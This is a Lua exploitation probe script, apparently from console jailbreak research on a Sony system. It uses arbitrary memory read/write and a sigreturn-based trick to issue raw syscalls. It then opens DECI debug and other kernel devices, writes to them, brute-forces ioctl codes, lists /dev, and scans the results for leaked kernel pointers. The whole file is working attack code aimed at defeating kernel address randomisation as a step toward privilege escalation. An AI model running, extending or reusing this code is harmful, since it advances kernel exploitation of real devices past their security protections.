-- CRASH_CLASS: MODERATE
-- PROBE 137e: DECI device write/ioctl + full /dev listing
--
-- 137d showed all 16 DECI devices open (stdin=O_RDONLY, rest=O_WRONLY).
-- Read blocked on deci_stdin. This probe:
-- A: Open with O_NONBLOCK, fstat all devices, check dev_id for kptrs
-- B: Write test patterns to deci_stdout/tty devices
-- C: Try DECI-specific ioctl codes
-- D: Full /dev listing (continue past first 30 entries)
-- E: Open and probe other discovered devices

print("=== PROBE 137e: DECI WRITE + DEV SCAN ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

local path_buf = gpu + 0x100
local stat_buf = gpu + 0x200
local io_buf = gpu + 0x400

--------------------------------------------------------------------
-- SECTION A: Open key DECI devices with O_NONBLOCK, fstat all
--------------------------------------------------------------------
print("")
print("--- [A] DECI fstat ---")

-- O_NONBLOCK = 0x4, O_WRONLY = 0x1, O_RDONLY = 0x0
local devs_to_test = {
    {name="deci_stdin",  flags=0x4},       -- RDONLY|NONBLOCK
    {name="deci_stdout", flags=0x5},       -- WRONLY|NONBLOCK
    {name="deci_stderr", flags=0x5},
    {name="deci_tty2",   flags=0x5},
    {name="deci_ttya0",  flags=0x5},
    {name="deci_ttyb0",  flags=0x5},
    {name="deci_ttyc0",  flags=0x5},
}

local open_fds = {}
for _, d in ipairs(devs_to_test) do
    ws(path_buf, "/dev/" .. d.name)
    local fd = srop(5, ua(path_buf), uint64(d.flags))
    local fh, fl = get_hi_lo(fd)
    if fl > 0 and fl < 256 and fh == 0 then
        table.insert(open_fds, {name=d.name, fd=fl})

        -- fstat
        zero(stat_buf, 0x100)
        srop(189, uint64(fl), ua(stat_buf))
        -- Full stat dump for kernel pointer scan
        for off = 0, 0x78, 8 do
            local v = safe_rq(stat_buf + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print(string.format("[A] *** KPTR %s stat+0x%02X: %s ***",
                        d.name, off, hex(v)))
                end
                if off == 0 or off == 0x50 then
                    print(string.format("[A] %s %s=%s",
                        d.name, off == 0 and "st_dev" or "st_rdev", hex(v)))
                end
            end
        end
    end
end
print("[A] opened " .. #open_fds)
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: Write to DECI devices
--------------------------------------------------------------------
print("")
print("--- [B] DECI write ---")

local write_buf = gpu + 0x600
for _, d in ipairs(open_fds) do
    if d.name ~= "deci_stdin" then
        -- Write a test string
        ws(write_buf, "PROBE_TEST\n")
        local rv_w = srop(4, uint64(d.fd), ua(write_buf), uint64(11))
        local wh, wl = get_hi_lo(rv_w)
        if wl > 0 and wl < 100 and wh == 0 then
            print(string.format("[B] %s: wrote %d bytes!", d.name, wl))
        elseif wl == 0 and wh == 0 then
            print(string.format("[B] %s: write returned 0", d.name))
        else
            print(string.format("[B] %s: write=%s", d.name, hex(rv_w)))
        end
    end
end

-- Try reading deci_stdin with O_NONBLOCK
for _, d in ipairs(open_fds) do
    if d.name == "deci_stdin" then
        zero(write_buf, 0x100)
        local rv_r = srop(3, uint64(d.fd), ua(write_buf), uint64(0x100))
        local rrh, rrl = get_hi_lo(rv_r)
        if rrl > 0 and rrl < 0x200 and rrh == 0 then
            print(string.format("[B] deci_stdin read: %d bytes!", rrl))
            local s = ""
            for i = 0, math.min(rrl, 64) - 1 do
                s = s .. string.format("%02X ", to_num(memory.read_byte(write_buf + i)))
            end
            print("[B] " .. s)
        else
            print("[B] deci_stdin read=" .. hex(rv_r) .. " (EAGAIN expected with NONBLOCK)")
        end
    end
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION C: DECI ioctl codes
-- DECI uses custom ioctl codes. Try variations.
--------------------------------------------------------------------
print("")
print("--- [C] DECI ioctl ---")

-- Pick deci_stdout for ioctl testing
local test_fd = -1
for _, d in ipairs(open_fds) do
    if d.name == "deci_stdout" then test_fd = d.fd break end
end

if test_fd > 0 then
    -- Try various ioctl directions and groups
    -- Standard TTY group 't' = 0x74
    -- DECI might use custom group
    local ioctl_codes = {
        -- Standard TTY
        0x40487413,  -- TIOCGETA
        0x40087468,  -- TIOCGWINSZ
        0x40047477,  -- TIOCGPGRP
        0x4004667F,  -- FIONREAD
        0x40047463,  -- TIOCGSID
        -- DECI custom (guess based on Sony patterns)
        0x40044400,  -- group 'D'
        0x40044401,
        0xC0044400,
        0xC0044401,
        0x40084400,
        0x40084401,
        -- Group lowercase 'd' = 0x64
        0x40046400,
        0x40046401,
        0xC0046400,
        -- Group 0x88 (Sony HID group seen before)
        0x40048800,
        0x40048801,
        0x40048806,
        0x40048807,
        -- Void ioctls (direction=0x20, no data)
        0x20004400,
        0x20004401,
        0x20006400,
    }

    for _, code in ipairs(ioctl_codes) do
        zero(io_buf, 0x100)
        local rv_io = srop(54, uint64(test_fd), uint64(code), ua(io_buf))
        local ioh, iol = get_hi_lo(rv_io)
        if iol == 0 and ioh == 0 then
            print(string.format("[C] *** ioctl 0x%08X WORKS! ***", code))
            for off = 0, 0x40, 8 do
                local v = safe_rq(io_buf + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh > 0 or vl > 0 then
                        print(string.format("    +0x%02X: %s", off, hex(v)))
                    end
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        kfound = kfound + 1
                        print("    *** KERNEL POINTER! ***")
                    end
                end
            end
        end
    end
end

-- Close DECI fds
for _, d in ipairs(open_fds) do srop(6, uint64(d.fd)) end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION D: Full /dev listing
--------------------------------------------------------------------
print("")
print("--- [D] /dev listing (all) ---")

ws(path_buf, "/dev")
local fd_dev = srop(5, ua(path_buf), uint64(0x20000))
local devh, devl = get_hi_lo(fd_dev)

if devl > 0 and devl < 256 and devh == 0 then
    local dir_buf = gpu + 0x800
    local basep = gpu + 0x7F80
    local all_names = {}

    for pass = 1, 10 do
        zero(dir_buf, 0x2000)
        memory.write_qword(basep, uint64(0))
        local rv_gd = srop(196, uint64(devl), ua(dir_buf), uint64(0x2000), ua(basep))
        local gdh, gdl = get_hi_lo(rv_gd)
        if gdl == 0 or gdh ~= 0 then break end

        local offset = 0
        local batch = 0
        while offset < gdl do
            local fileno = to_num(memory.read_dword(dir_buf + offset))
            local reclen = to_num(memory.read_dword(dir_buf + offset + 4)) % 65536
            local dtype = math.floor(to_num(memory.read_dword(dir_buf + offset + 4)) / 65536) % 256
            local namlen = math.floor(to_num(memory.read_dword(dir_buf + offset + 4)) / 16777216)
            if reclen == 0 then break end
            local name = ""
            for i = 0, math.min(namlen, 60) - 1 do
                local b = to_num(memory.read_byte(dir_buf + offset + 8 + i))
                if b >= 32 and b < 127 then name = name .. string.char(b) end
            end
            if #name > 0 then table.insert(all_names, name) end
            offset = offset + reclen
            batch = batch + 1
        end
        if batch == 0 then break end
    end
    print("[D] total names: " .. #all_names)
    -- Print ALL names
    for _, n in ipairs(all_names) do
        print("[D] " .. n)
    end
    srop(6, uint64(devl))
end
print("[D] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION E: Open ALL non-DECI /dev devices and fstat
--------------------------------------------------------------------
print("")
print("--- [E] Open other devices ---")

local extra_devs = {
    "console", "tty", "ptmx", "bpf", "pf",
    "gc", "dce", "gic", "camera", "notification0",
    "ajm", "ajmi", "bt", "usbctl", "hid",
    "dmem0", "dmem1", "dmem2", "rng", "crypto",
    "null", "zero", "random", "urandom",
}

for _, dev in ipairs(extra_devs) do
    ws(path_buf, "/dev/" .. dev)
    local fd = srop(5, ua(path_buf), uint64(2))  -- O_RDWR
    local fh, fl = get_hi_lo(fd)
    if fl == 0 or fl >= 256 or fh ~= 0 then
        fd = srop(5, ua(path_buf), uint64(0))  -- O_RDONLY
        fh, fl = get_hi_lo(fd)
    end
    if fl > 0 and fl < 256 and fh == 0 then
        -- Get st_rdev (device number)
        zero(stat_buf, 0x100)
        srop(189, uint64(fl), ua(stat_buf))
        local rdev = safe_rq(stat_buf + 0x50)
        local rdh, rdl = get_hi_lo(rdev)
        print(string.format("[E] /dev/%s fd=%d rdev=%s", dev, fl, hex(rdev)))
        if rdh >= 0xFFFF8000 and rdh ~= 0xFFFFFFFF then
            kfound = kfound + 1
            print("  *** KERNEL POINTER in rdev! ***")
        end
        srop(6, uint64(fl))
    end
end
print("[E] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
